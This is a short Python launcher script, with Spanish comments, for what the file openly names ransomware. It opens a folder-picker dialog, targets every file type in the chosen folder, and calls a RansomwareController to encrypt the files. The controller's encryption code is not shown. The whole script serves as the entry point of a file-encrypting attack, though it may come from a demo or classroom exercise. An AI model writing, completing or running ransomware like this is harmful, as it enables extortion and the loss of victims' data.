from controllers.ransomware_controller import RansomwareController
from tkinter import Tk, filedialog
import os

def main():
    # Oculta la ventana principal de tkinter
    root = Tk()
    root.withdraw()
    
    # Muestra un cuadro de diálogo para seleccionar la carpeta de destino
    destination = filedialog.askdirectory(title="Selecciona la carpeta para cifrar")

    if not destination:
        print("No se seleccionó ninguna carpeta.")
        return
    
    # Extensiones de archivos que se cifrarán
    extensions = None

    # Crear una instancia del controlador de ransomware
    ransomware = RansomwareController(destination, extensions)

    # Iniciar el proceso de cifrado de archivos
    ransomware.encrypt_files()

if __name__ == '__main__':
    main()